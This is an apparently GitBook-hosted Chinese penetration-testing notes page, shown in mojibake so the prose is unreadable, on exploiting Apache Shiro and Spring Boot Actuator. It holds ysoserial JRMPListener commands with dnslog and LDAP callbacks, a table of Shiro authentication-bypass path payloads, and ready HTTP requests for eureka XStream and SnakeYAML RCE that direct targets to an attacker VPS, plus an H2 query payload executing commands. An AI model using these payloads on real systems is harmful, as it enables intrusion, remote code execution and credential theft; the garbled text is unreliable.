Attackçš„å‰ç¼€ã€‚ åŠ å¯† ysoserial çš„åºåˆ—åŒ– payloadï¼Œé€šè¿‡Padding Oracle Attackåˆ¶ä½œæ¶æ„RememberMeã€‚ é‡æ”¾æ¶æ„RememberMe cookieï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚ ä¿®å¤ åœ¨ä¹‹åçš„ç‰ˆæœ¬åŠ å¯†æ¨¡å¼ AES-CBCè¢«æ›´æ¢ä¸º AES-GCMï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨å·¥å…·ç­‰æ—¶éœ€è¦æ³¨æ„è¯¥åŠ å¯†æ¨¡å¼çš„å˜åŒ–ã€‚ ååºåˆ—åŒ–æ¼æ´å¸¸è§é—®é¢˜ å¯†é’¥è·å– githubæ”¶é›† securityManager.rememberMeManager.cipherKey cookieRememberMeManager.setCipherKey setCipherKey(Base64.decode ä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½ heapdump çˆ†ç ´ ä½¿ç”¨ä¸€ä¸ªç©ºçš„ SimplePrincipalCollectionä½œä¸º payloadï¼Œåºåˆ—åŒ–åä½¿ç”¨å¾…æ£€æµ‹çš„ç§˜é’¥è¿›è¡ŒåŠ å¯†å¹¶å‘é€ã€‚ å½“å¯†é’¥æ­£ç¡®æ—¶ä¸è¿”å›deleteMe å¯†é’¥é”™è¯¯æ—¶è¿”å› deleteMe è¿˜æœ‰ä¸€ç§æƒ…å†µï¼Œå¦‚æœç§˜é’¥æ­£ç¡®è¿”å›çš„æ˜¯ä¸€ä¸ª deleteMeï¼Œå¯†é’¥é”™è¯¯è¿”å›çš„æ˜¯ä¸¤ä¸ª deleteMeã€‚ WAFç»•è¿‡ cookieå†…å®¹æ£€æµ‹ Tomcat 9.0.19 æ’å…¥\\x0d æ’å…¥Base64åƒåœ¾æ•°æ®ç»•è¿‡ï¼ˆFUZZï¼‰ æœªçŸ¥httpè¯·æ±‚ æœªçŸ¥httpè¯·æ±‚æ—¶ï¼Œshiroæ˜¯å…ˆå¤„ç†cookieååœ¨åˆ°servletï¼Œæ‰€ä»¥rememberMeå€¼æ˜¯ä¼šå¤„ç†çš„ è¯·æ±‚å¤´å¤§å°è¢«é™åˆ¶ tomcaté»˜è®¤headeræœ€å¤§é•¿åº¦è®¾ç½®ä¸º8192å­—èŠ‚ äººä¸ºå¯¹Cookieé•¿åº¦è¿›è¡Œé™åˆ¶ è§£å†³æ€è·¯ï¼š shiroçš„payloadé•¿åº¦é™åˆ¶ç»•è¿‡-CSDNåšå®¢ æµ…æShiroååºåˆ—åŒ–Payloadé•¿åº¦ç»•è¿‡ (qq.com) ç¬¬ä¸€ç§è§£å†³æ–¹æ³•å¤ç° Tomcatå…è®¸çš„HTTP Headeræœ€å¤§å€¼maxHttpHeaderSize headerè¿‡é•¿ï¼ŒæœåŠ¡ç«¯æŠ¥400é”™è¯¯ æ„é€ headerå¤´çš„ç±»æ„é€ å™¨ æ„é€ CBé“¾è¿›è¡Œåºåˆ—åŒ– å°†test.binæ–‡ä»¶è¿›è¡Œå¤„ç† ç”Ÿæˆå¤–éƒ¨å­—èŠ‚ç å†…å®¹ public class CalcTest { public CalcTest() throws Exception { Runtime.getRuntime().exec(\"calc\"); } } javac CalcTest.java cat CalcTest.class |base64|sed ':label;N;s/\\n//;b label' å‘é€payload äººå®¶å·¥å…·å·²ç»å®ç°äº† æ³¨å…¥å†…å­˜é©¬ æœ‰keyæ— é“¾ ç”¨ç°åœ¨å…¬å¼€çš„ dnsæˆ–è€…å»¶è¿Ÿæ¢æµ‹ çˆ†ç ´è¯•æ¢å­˜åœ¨çš„classåŒ… å·¥å…·éƒ½ç°æˆçš„ ç„¶åæ ¹æ®å­˜åœ¨çš„åŒ…åˆ¤æ–­ç‰ˆæœ¬å·®å¼‚è‡ªå·±æ„é€ ç»„åˆé“¾ éƒ½çŸ¥é“å®˜æ–¹é“¾æ–¹ä¾¿ç›¯ç€å…³é”®å‡½æ•°ï¼Œé€šç”¨çš„rceé“¾åŸºæœ¬éƒ½è—ç€å®˜æ–¹ä¿®å¤éƒ½æ²¡å¾—ç© ç°åœ¨æ¯”è¾ƒå¤šçš„æ˜¯åˆ©ç”¨ç¬¬ä¸‰æ–¹æœåŠ¡æ¯”å¦‚mysql redis jdbc é€šè¿‡æœ‰é™æ“ä½œçš„é“¾å»åˆ©ç”¨ é“¾å­å¤šçš„å·¥å…·ï¼šshiro-tool ï¼Œç»å¸¸è¯†åˆ«å‡ºJRMP Cilentï¼ˆğŸ¥¦ğŸ•åªä¼šç”¨å·¥å…·ï¼‰ shiroååºåˆ—æ¼æ´ä¸­JRMPClientåˆ©ç”¨ (qq.com) shiro JRMP gadget | BlogPapers (sumsec.me) ysoserialèµ·JRMPæœåŠ¡ java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 \"ping w3dh1h.dnslog.cn\" java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar ysoserial.exploit.JRMPListener 8088 CommonsBeanutils2 \"ldap://ip:1389/Basic/Command/Whoami\" ç”±äºShiroé‡å†™äº†resolveClassæ–¹æ³•ï¼Œå°†åŸç”Ÿæ–¹æ³•ä¸­çš„forNameæ–¹æ³•æ›¿æ¢ä¸ºloadClassæ–¹æ³•ï¼Œç”±äºloadClassæ— æ³•åŠ è½½æ•°ç»„ç±»å‹çš„ç±»ï¼Œå› æ­¤å­˜åœ¨Transformer[]ç±»çš„CommonCollections gadgetæ— æ³•æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´ï¼Œï¼ˆä¾‹å¦‚ysoserial CommonCollections1ã€CommonCollections3ï¼‰ æ€è·¯ï¼š shiroé»˜è®¤æ˜¯æ²¡æœ‰ccä¾èµ–çš„ï¼Œä½†æ˜¯å­˜åœ¨commons-beanutils 1.8.3ä¾èµ– å·¥å…·è¯†åˆ«é—®é¢˜ æ¯”å¦‚302è·³è½¬ï¼Œburpæ’ä»¶è¯†åˆ«å‡ºæ¥äº†ï¼Œä½†æ˜¯å·¥å…·è¯†åˆ«ä¸å‡ºæ¥ è§£å†³ï¼šå·¥å…·èµ°burpä»£ç†ï¼Œå°†å“åº”302æ”¹ä¸º200 èº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ shiroæƒé™ç®¡ç†åŸç† Shiroçš„è®¤è¯æˆæƒæµç¨‹ å½“æˆ‘ä»¬çš„ç”¨æˆ·(subject)å»è®¤è¯çš„æ—¶å€™ï¼Œç”¨æˆ·æºå¸¦æˆ‘ä»¬çš„èº«ä»½ä¿¡æ¯ï¼Œå‡­æ®ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åå’Œå¯†ç  Shiroä¼šå°†æˆ‘ä»¬çš„ç”¨æˆ·åå’Œå¯†ç å°è£…æˆä¸€ä¸ªToken ç„¶åé€šè¿‡å®‰å…¨ç®¡ç†å™¨(SecurityManager) å®‰å…¨ç®¡ç†å™¨(SecurityManager)å»è°ƒç”¨è®¤è¯å™¨(Authenticator) è®¤è¯å™¨(Authenticator)å»è°ƒç”¨æˆ‘ä»¬çš„Realmå»è·å–æ•°æ®ï¼Œç„¶åè¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœå¯¹æ¯”æˆåŠŸçš„è¯ï¼Œé‚£ä¹ˆå°±è®¤è¯æˆåŠŸäº†ï¼Œå¦åˆ™è®¤è¯å¤±è´¥ã€‚ è®¤è¯æˆåŠŸåä¼šè°ƒç”¨æˆæƒå™¨ï¼ˆAuthorizerï¼‰æ¥åˆ¤æ–­è¿™ä¸ªç”¨æˆ·èº«ä»½æœ‰ä»€ä¹ˆæƒé™ï¼Œä»–å¯ä»¥è®¿é—®å“ªäº›èµ„æºã€‚ SessionManageræ˜¯ä¸€ä¸ªä¼šè¯ç®¡ç†å™¨ï¼Œï¼Œshiroæ¡†æ¶å®šä¹‰äº†ä¸€å¥—ä¼šè¯ç®¡ç†ï¼Œ å®ƒä¸ä¾èµ–webå®¹å™¨çš„sessionï¼Œæ‰€ä»¥shiroå¯ä»¥ä½¿ç”¨åœ¨éweb åº”ç”¨ä¸Šï¼Œä¹Ÿå¯ä»¥å°†åˆ†å¸ƒå¼åº”ç”¨çš„ä¼šè¯é›†ä¸­åœ¨ä¸€ç‚¹ç®¡ç†ï¼Œæ­¤ ç‰¹æ€§å¯ä½¿å®ƒå®ç°å•ç‚¹ç™»å½•ã€‚ SessionDAOå…¶å®å°±æ˜¯ä¼šè¯ï¼Œæ¯”å¦‚è¦å°†Sessionå­˜å‚¨åˆ°æ•°æ®åº“ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡jdbcæ¥å­˜å‚¨åˆ°æ•°æ®åº“ã€‚ Spring+Shiroå…³é”®ä»£ç  shiro.ini [users] user=user,user admin=admin,admin [roles] admin=* user=user å®šä¹‰äº†ä¸¤ä¸ªç”¨æˆ·å’Œä¸¤ä¸ªè§’è‰²ã€‚å…¶ä¸­ï¼Œadminè§’è‰²æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œè€Œuserè§’è‰²åªæ‹¥æœ‰useræƒé™ã€‚è¿™æ„å‘³ç€adminç”¨æˆ·å…·æœ‰æ‰€æœ‰æƒé™ï¼Œè€Œuserç”¨æˆ·ä»…å…·æœ‰useræƒé™ Filteré“¾ ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean(); //ç»™filterè®¾ç½®å®‰å…¨ç®¡ç†å™¨ shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager); //é…ç½®è·¯å¾„è®¿é—® Map map = new HashMap(); map.put(\"/secret.html\", \"authc, roles[admin]\"); map.put(\"/**\", \"anon\"); //é»˜è®¤è®¤è¯ç•Œé¢è·¯å¾„---å½“è®¤è¯ä¸é€šè¿‡æ—¶è·³è½¬ shiroFilterFactoryBean.setLoginUrl(\"/login.html\"); shiroFilterFactoryBean.setUnauthorizedUrl(\"/unauthorized.html\"); // è®¾ç½®URLè·¯å¾„ä¸è¿‡æ»¤å™¨çš„æ˜ å°„å…³ç³» shiroFilterFactoryBean.setFilterChainDefinitionMap(map); è§£é‡Š æ‰€æœ‰ä»¥ / å¼€å¤´çš„è·¯å¾„ï¼ˆåŒ…æ‹¬å­è·¯å¾„ï¼‰éƒ½å¯ä»¥åŒ¿åè®¿é—®ï¼Œæ— éœ€è®¤è¯å’Œæˆæƒã€‚ä½†æ˜¯ï¼Œåªæœ‰ç»è¿‡è®¤è¯çš„ç”¨æˆ·å¹¶æœ‰admin è§’è‰²æˆæƒæ‰èƒ½è®¿é—® /secret.html è·¯å¾„ï¼Œå½“æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„èµ„æºå¦‚/secret.htmlæ—¶å°†è¢«é‡å®šå‘åˆ°/login.htmlï¼Œå½“ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼ˆuserï¼‰è®¿é—®ä¸ç¬¦åˆå…¶è®¿é—®æƒé™çš„èµ„æº/secret.htmlæ—¶å°†è¢«é‡å®šå‘åˆ°/unauthorized.html // AntPathMatcheråŒ¹é…è§„åˆ™ ? åŒ¹é…ä»»æ„ä¸€ä¸ªå•å­—ç¬¦ * åŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦ å³/admin/* å¯ä»¥åŒ¹é… /admin/a ä½†æ˜¯ä¸èƒ½åŒ¹é… /admin/b/c/d ** åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªç›®å½• å³/admin/** å¯ä»¥åŒ¹é… /admin/a æˆ–è€… /admin/b/c/d ç­‰è¯·æ±‚ // å¸¸è§è¿‡æ»¤å™¨ anonï¼ˆåŒ¿åè®¿é—®ï¼‰ï¼šå…è®¸åŒ¿åè®¿é—®ï¼Œä¸éœ€è¦è®¤è¯ã€‚ authcï¼ˆèº«ä»½éªŒè¯ï¼‰ï¼šè¦æ±‚ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆç™»å½•ï¼‰æ‰èƒ½è®¿é—®ã€‚ userï¼ˆè®°ä½æˆ‘æˆ–èº«ä»½éªŒè¯é€šè¿‡ï¼‰ï¼šç”¨æˆ·å·²è¿›è¡Œèº«ä»½éªŒè¯æˆ–é€‰æ‹©äº†è®°ä½æˆ‘åŠŸèƒ½å¯è®¿é—®ã€‚ permsï¼ˆæƒé™æ§åˆ¶ï¼‰ï¼šè¦æ±‚ç”¨æˆ·å…·æœ‰ç‰¹å®šçš„æƒé™æ‰èƒ½è®¿é—®ã€‚ rolesï¼ˆè§’è‰²æ§åˆ¶ï¼‰ï¼šè¦æ±‚ç”¨æˆ·å…·æœ‰ç‰¹å®šçš„è§’è‰²æ‰èƒ½è®¿é—®ã€‚ portï¼ˆç«¯å£æ§åˆ¶ï¼‰ï¼šè¦æ±‚è¯·æ±‚çš„ç«¯å£ä¸æŒ‡å®šçš„ç«¯å£åŒ¹é…æ‰èƒ½è®¿é—®ã€‚ sslï¼ˆSSLå®‰å…¨ï¼‰ï¼šè¦æ±‚è¯·æ±‚é€šè¿‡SSL/TLSåè®®è¿›è¡Œå®‰å…¨è®¿é—®ã€‚ restï¼ˆRESTfulé£æ ¼æ”¯æŒï¼‰ï¼šä¸ºRESTful APIæä¾›æ”¯æŒã€‚ // ShiroFilterFactoryBeanå¸¸ç”¨æ–¹æ³• setLoginUrl(String loginUrl) è®¾ç½®ç™»å½•é¡µé¢çš„URLæœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®éœ€è¦èº«ä»½éªŒè¯çš„èµ„æºæ—¶å°†è¢«é‡å®šå‘åˆ°è¯¥URL setSuccessUrl(String successUrl) è®¾ç½®æˆåŠŸç™»å½•åè·³è½¬çš„URL setUnauthorizedUrl(String unauthorizedUrl) è®¾ç½®æœªæˆæƒé¡µé¢çš„URLï¼Œå½“ç”¨æˆ·æ²¡æœ‰è®¿é—®æƒé™æ—¶å°†è¢«é‡å®šå‘åˆ°è¯¥URL èº«ä»½éªŒè¯ç»•è¿‡ å¤§éƒ¨åˆ†æƒé™ç»•è¿‡éƒ½æºè‡ªäºSpringå’ŒShiroå¯¹è¯·æ±‚å¤„ç†çš„ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚ Shiro å†å²æ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) ç¼–å· ç‰ˆæœ¬å½±å“ é‰´æƒè·¯å¾„ ç»•è¿‡payload åç«¯é…ç½® CVE-2023-22602 Apache Shiro =2.6 /admin /admin/.. CVE-2022-32532 Shiro /admin /admin/%0dï¼Œ/admin/%0a RegExPatternMatcher&&/admin/.* CVE-2020-1957 Shiro /admin /xxx/..;/admin/ï¼ˆxxxä¸ºæˆæƒè·¯å¾„ï¼‰ CVE-2016-6802 shrio /admin /xxx/../adminï¼ˆxxxéšæ„ä¸å­˜åœ¨ä¹Ÿè¡Œï¼‰ CVE-2020-11989 shiro /admin (shiroç­‰äº1.5.2ï¼‰ /admin%25%32%66ï¼ˆ%25%32%66ä¸º/çš„åŒé‡urlç¼–ç ï¼‰ (shiroå°äº1.5.3ï¼‰/;/admin (shiroç­‰äº1.5.2ï¼‰/admin/* = authcï¼› (shiroå°äº1.5.3ï¼‰/admin/* = authc && /** = anon CVE-2020-13933 Shiro /admin /admin/%3Bxxxï¼ˆxxxä¸ºéšæ„å­—ç¬¦ä¸²ï¼‰ /admin/* = authc CVE-2020-17510 Shiro /admin /admin/%2e /admin/* = authc CVE-2020-17523 Shiro /admin /admin%20 /admin/* = authc å‚è€ƒæ–‡ç«  Shiro ç»„ä»¶æ¼æ´ä¸æ”»å‡»é“¾åˆ†æ Shiro RememberMe æ¼æ´æ£€æµ‹çš„æ¢ç´¢ä¹‹è·¯ Shiroååºåˆ—åŒ–æ¼æ´ç¬”è®°äº”ï¼ˆå¯¹æŠ—ç¯‡ï¼‰ (changxia3.com) shiroååºåˆ—åŒ–ç»•WAFä¹‹æœªçŸ¥HTTPè¯·æ±‚æ–¹æ³• | å›å¿†é£˜å¦‚é›ª (gv7.me) shiroæƒé™ç»•è¿‡æ€»ç»“ (qq.com) Shiroä»å…¥é—¨åˆ°æƒé™ç»•è¿‡æ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 21:43:37 "},"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/springæ¼æ´å¤ç°.html":{"url":"01.æ¸—é€æµ‹è¯•/05.æ¼æ´å¤ç°/springæ¼æ´å¤ç°.html","title":"Springæ¡†æ¶æ¼æ´","keywords":"","body":"Springæ¦‚è¿° Spring Framework æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨ç¨‹åºæ¡†æ¶å’Œ Java å¹³å°çš„æ§åˆ¶å®¹å™¨çš„åè½¬ã€‚ç”±äºå…¶å¼ºå¤§çš„åŠŸèƒ½å’Œæ˜“ç”¨æ€§ï¼Œå®ƒåœ¨è¡Œä¸šä¸­è¢«å„ç§ç¨‹åºå’Œç³»ç»Ÿå¹¿æ³›ä½¿ç”¨ã€‚ä¸€äº›çŸ¥åäº§å“å¦‚ Spring Boot å’Œ Spring Cloud éƒ½æ˜¯ä½¿ç”¨ Spring Framework å¼€å‘çš„ã€‚ æ¡†æ¶ç‰¹å¾ å¦‚æœ Web åº”ç”¨ç¨‹åºçš„ favicon.ico å›¾æ ‡é»˜è®¤æ²¡æœ‰æ›´æ”¹ï¼Œæ˜¯ä¸€ä¸ªå°ç»¿å¶ FoFaè¯­æ³• icon_hash=\"116323821\" å¦‚æœ web åº”ç”¨å¼€å‘è€…æ²¡æœ‰ä¿®æ”¹ SpringBoot Web åº”ç”¨çš„é»˜è®¤ 4xxã€5xx æŠ¥é”™é¡µé¢ï¼Œé‚£ä¹ˆå½“ web åº”ç”¨ç¨‹åºå‡ºç° 4xxã€5xx é”™è¯¯æ—¶ï¼Œä¼šæŠ¥é”™å¦‚ä¸‹å›¾ï¼š FoFaè¯­æ³• body=\"Whitelabel Error Page\" Spring Boot Actuatoræœªæˆæƒè®¿é—® Actuatoræ¦‚è¿° â€‹ Actuator æ˜¯ springboot æä¾›çš„ç”¨æ¥å¯¹åº”ç”¨ç³»ç»Ÿè¿›è¡Œè‡ªçœå’Œç›‘æ§çš„åŠŸèƒ½æ¨¡å—ï¼Œå€ŸåŠ©äº Actuator å¼€å‘è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹åº”ç”¨ç³»ç»ŸæŸäº›ç›‘æ§æŒ‡æ ‡è¿›è¡ŒæŸ¥çœ‹ã€ç»Ÿè®¡ç­‰ã€‚åœ¨ Actuator å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšå¥½ç›¸å…³æƒé™æ§åˆ¶ï¼Œéæ³•ç”¨æˆ·å¯é€šè¿‡è®¿é—®é»˜è®¤çš„æ‰§è¡Œå™¨ç«¯ç‚¹ï¼ˆendpointsï¼‰æ¥è·å–åº”ç”¨ç³»ç»Ÿä¸­çš„ç›‘æ§ä¿¡æ¯ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ç”šè‡³æœåŠ¡å™¨è¢«æ¥ç®¡çš„äº‹ä»¶å‘ç”Ÿã€‚ â€‹ å…¶æä¾›çš„æ‰§è¡Œå™¨ç«¯ç‚¹åˆ†ä¸ºä¸¤ç±»ï¼šåŸç”Ÿç«¯ç‚¹å’Œç”¨æˆ·è‡ªå®šä¹‰æ‰©å±•ç«¯ç‚¹ï¼ŒåŸç”Ÿç«¯ç‚¹ä¸»è¦æœ‰ï¼š ç‰ˆæœ¬é—®é¢˜ Spring Boot Spring Boot >= 1.5ï¼šé»˜è®¤åªå…è®¸è®¿é—® /health å’Œ /info ç«¯ç‚¹ï¼Œä½†æ˜¯æ­¤å®‰å…¨æ€§é€šå¸¸è¢«åº”ç”¨ç¨‹åºå¼€å‘äººå‘˜ç¦ç”¨äº† Spring Boot2.xç›¸æ¯”äº1.xç‰ˆæœ¬çš„ç«¯ç‚¹å¤šäº†ä¸ªå‰ç¼€ /actuatorï¼Œå¦‚/health å˜æˆäº†/actuator/healthã€‚ ç«¯ç‚¹è·¯å¾„ è®¾ç½®ç®¡ç†ç«¯ç‚¹çš„è·¯å¾„: åœ¨1.xç‰ˆæœ¬ä¸‹ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹: management.context-path =/manage æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†: /manage/dump /manage/autoconfig /manage/metrics ... åœ¨2.xç‰ˆæœ¬ï¼Œè®¾ç½®è¯­å¥å¦‚ä¸‹: management.endpoints.web.base-path=/manage æ­¤æ—¶ç«¯ç‚¹çš„è®¿é—®æ–¹å¼å°±å˜ä¸ºäº†: # /actuatorè¢«manageä»£æ›¿ /manage/dump /manage/autoconfig /manage/metrics ... æœ‰äº›äººå¯èƒ½å–œæ¬¢å°†å…¶å‘½åä¸ºmonitor,æ‰€ä»¥çŸ¥é“è¿™ä¸ªç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“ä¸°å¯Œä¸‹è‡ªå·±çš„å­—å…¸ã€‚ Actuatorç«¯ç‚¹åˆ©ç”¨ /mappings æ³„éœ²è·¯ç”±ä¿¡æ¯ /traceï¼Œ/httptrace è·å–åŸºæœ¬çš„ HTTP è¯·æ±‚è·Ÿè¸ªä¿¡æ¯ï¼ˆæ—¶é—´æˆ³ã€HTTP å¤´ç­‰ï¼‰ å­˜åœ¨çš„éšæ‚£ï¼šå¦‚æœå­˜åœ¨ç™»å½•ç”¨æˆ·çš„æ“ä½œè¯·æ±‚ï¼Œå¯ä»¥çªƒå–ç”¨æˆ·å‡­è¯ã€‚ æ³¨æ„ï¼šè¿™ä¸ªåªæ˜¯æ˜¾ç¤ºæœ€è¿‘çš„100æ¡æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™è„šæœ¬æ¥æŒç»­ç›‘æ§ã€‚ /env è·å–å…¨éƒ¨ç¯å¢ƒå±æ€§ å­˜åœ¨çš„éšæ‚£ å¯èƒ½ä¼šæ³„éœ²æ•°æ®åº“è´¦å·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯,ä½†æ˜¯æ³„éœ²çš„å¯†ç ä¼šç”¨æ˜Ÿå·è¿›è¡Œè„±æ•ï¼Œæƒ³è¦è·å–ç›¸åº”çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥å°è¯•é€šè¿‡åˆ†æheapdumpæ•°æ®çš„æ–¹å¼ Spring eureka xstream RCE /heapdump Heap Dumpä¹Ÿå«å †è½¬å‚¨æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªJavaè¿›ç¨‹åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„å†…å­˜å¿«ç…§ Heap Dumpæ˜¯æœ‰ç€å¤šç§ç±»å‹çš„ï¼Œä¸è¿‡æ€»ä½“ä¸Šheap dumpåœ¨è§¦å‘å¿«ç…§çš„æ—¶å€™éƒ½ä¿å­˜äº†javaå¯¹è±¡å’Œç±»çš„ä¿¡æ¯ é€šå¸¸åœ¨å†™heap dumpæ–‡ä»¶å‰ä¼šè§¦å‘ä¸€æ¬¡FullGCï¼Œæ‰€ä»¥heap dumpæ–‡ä»¶ä¸­ä¿å­˜çš„æ˜¯FullGCåç•™ä¸‹çš„å¯¹è±¡ä¿¡æ¯ã€‚å…¶ä¸­å¯èƒ½ä¼šå«æœ‰æ•æ„Ÿæ•°æ®ï¼Œå¦‚æ•°æ®åº“çš„å¯†ç æ˜æ–‡,accesskeyç­‰ è®¿é—®åä¼šä¸‹è½½heapdump heapdumpåˆ†æå·¥å…· wyzxxz/heapdump_tool: heapdumpæ•æ„Ÿä¿¡æ¯æŸ¥è¯¢å·¥å…·ï¼Œä¾‹å¦‚æŸ¥æ‰¾ spring heapdumpä¸­çš„å¯†ç æ˜æ–‡ï¼ŒAK,SKç­‰ åŸºäºJAVAè‡ªå¸¦çš„jhatï¼Œé€šè¿‡jhatè§£æheapdumpæ–‡ä»¶ JDumpSpider java -jar .\\JDumpSpider-1.1-SNAPSHOT-full.jar .\\heapdump /redis/info å¦‚æœå¼€æ”¾äº†redisæœåŠ¡ï¼ˆ1234ç«¯å£ï¼‰ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨/actuator/redis/infoè¯­å¥çœ‹æ˜¯å¦èƒ½è¯»å–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ï¼šhttp://www.xxx.com:1234/actuator/redis/info Spring eureka xstream RCE åˆ©ç”¨æ¡ä»¶ å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /env æ¥å£è®¾ç½®å±æ€§ å¯ä»¥ POST è¯·æ±‚ç›®æ ‡ç½‘ç«™çš„ /refresh æ¥å£åˆ·æ–°é…ç½®ï¼ˆå­˜åœ¨ spring-boot-starter-actuator ä¾èµ–ï¼‰ ç›®æ ‡ä½¿ç”¨çš„ eureka-client spring-cloud-starter-netflix-eureka-client ä¾èµ–ä¸­ï¼‰ ç›®æ ‡å¯ä»¥è¯·æ±‚æ”»å‡»è€…çš„ HTTP æœåŠ¡å™¨ï¼ˆè¯·æ±‚å¯å‡ºå¤–ç½‘ï¼‰ å¤ç° ä¿®æ”¹è¦æ‰§è¡Œçš„å‘½ä»¤å èµ·ä¸€ä¸ªæ¶æ„eureka server è®¾ç½®eureka.client.serviceUrl.defaultZone å±æ€§ä¸ºæ¶æ„çš„å¤–éƒ¨ eureka server URL åœ°å€ # spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example # spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"} refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ URLï¼Œæå‰æ¶è®¾çš„ eureka server å°±ä¼šè¿”å›æ¶æ„çš„ payload # spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded # spring 2.x POST /actuator/refresh Content-Type: application/json ä»è€Œè§¦å‘ XStream ååºåˆ—åŒ–ï¼Œé€ æˆ RCE æ¼æ´ æ‰§è¡Œå®Œå‘½ä»¤åè®°å¾—æ¢å¤ï¼Œå¦‚æœä¸æ¢å¤çš„è¯ï¼Œé‚£ä¹ˆå‘½ä»¤å°±ä¼šä¸€ç›´æ‰§è¡Œï¼Œç³»ç»Ÿä¹Ÿä¼šä¸€ç›´æŠ¥é”™ï¼Œå°†eureka.client.serviceUrl.defaultZoneå±æ€§è®¾ç½®ä¸ºåŸæ¥çš„å³å¯ã€‚ â€‹ Spring cloud SnakeYAML RCE ç‰ˆæœ¬å½±å“ ç›®æ ‡ä¾èµ–çš„ spring-cloud-starter ç‰ˆæœ¬ \\ å¤ç° æœ¬åœ°ç”Ÿæˆyaml-payloadçš„jaråŒ…,å‘½ä»¤ä¸º ç”Ÿæˆåˆ©ç”¨è¯¥jaråŒ…çš„example.ymlæ–‡ä»¶ æŒ‚è½½æœåŠ¡ è®¾ç½®spring.cloud.bootstrap.location å±æ€§ä¸ºå¤–éƒ¨æ¶æ„ yml æ–‡ä»¶ URL åœ°å€ # spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example.yml # spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example.yml\"} refresh è§¦å‘ç›®æ ‡æœºå™¨è¯·æ±‚è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„ yml æ–‡ä»¶ï¼Œè·å¾—å…¶å†…å®¹ # spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded # spring 2.x POST /actuator/refresh Content-Type: application/json SnakeYAML ç”±äºå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰€ä»¥è§£ææ¶æ„ yml å†…å®¹æ—¶ä¼šå®ŒæˆæŒ‡å®šçš„åŠ¨ä½œ,å…ˆæ˜¯è§¦å‘ java.net.URL å»æ‹‰å–è¿œç¨‹ HTTP æœåŠ¡å™¨ä¸Šçš„æ¶æ„ jar æ–‡ä»¶,ç„¶åæ˜¯å¯»æ‰¾ jar æ–‡ä»¶ä¸­å®ç° javax.script.ScriptEngineFactory æ¥å£çš„ç±»å¹¶å®ä¾‹åŒ–,å®ä¾‹åŒ–ç±»æ—¶æ‰§è¡Œæ¶æ„ä»£ç ï¼Œé€ æˆ RCE æ¼æ´ æ³¨å…¥å†…å­˜é©¬ Spring restart h2 database query RCE ç‰ˆæœ¬å½±å“ å­˜åœ¨ com.h2database.h2 ä¾èµ–ï¼ˆç‰ˆæœ¬è¦æ±‚æš‚æœªçŸ¥ï¼‰ å¤ç° hackbaréœ€è¦å°†åŸæœ¬çš„content-typeåˆ é™¤ï¼Œç„¶åé€‰æ‹©application/jsonæ‰å¯ä»¥å‘é€Content-Type: application/jsonçš„è¯·æ±‚ POST /actuator/env Content-Type: application/json {\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\"} POST /actuator/restart Content-Type: application/json 